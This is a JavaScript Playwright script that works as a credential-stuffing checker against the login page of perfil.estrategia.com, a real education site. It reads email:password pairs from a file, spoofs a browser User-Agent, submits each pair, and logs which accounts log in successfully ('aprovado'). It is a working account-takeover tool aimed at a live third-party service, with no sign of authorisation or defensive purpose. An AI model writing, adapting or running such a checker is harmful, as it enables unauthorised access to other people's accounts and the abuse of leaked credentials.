import { firefox } from "playwright-core";
import fs from 'fs';

(async () => {
    const browser = await firefox.launch({
        headless: false
    });

    const page = await browser.newPage();

    await page.setExtraHTTPHeaders({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
        'Accept-Language': 'en-US,en;q=0.9'
    });

    await page.goto('https://perfil.estrategia.com/login');

    await page.waitForLoadState('networkidle');

    const fileContent = fs.readFileSync('usuarios.txt', 'utf-8');
    const lines = fileContent.split('\n');

    for (const line of lines) {
        const [email, senha] = line.split(':');

        await page.getByText('Email*').click();
        await page.keyboard.type(email);
        await page.waitForTimeout(1000);
        await page.getByText('Senha*').click();
        await page.keyboard.type(senha);
        await page.locator('.c-button__content').first().click();
        await page.waitForTimeout(2000);

        try {
            // Verificar se a mensagem com o ID "text-toast" aparece
            await page.waitForSelector('#text-toast', { timeout: 5000 });
            console.log(`Email: ${email}, Senha: ${senha} foi reprovado`);

            // Refresh da página
            await page.goto('https://perfil.estrategia.com/login');
        } catch (error) {
            // A mensagem não apareceu, continue com o próximo email/senha
            await page.waitForSelector('#hero-container', { timeout: 5000 });
            console.log(`Email: ${email}, Senha: ${senha} foi aprovado`);
            await page.click('[name="arrow-down"]');
            await page.getByText('Sair').click();
            await page.waitForTimeout(2000);

        }
    }

    await browser.close();
})();
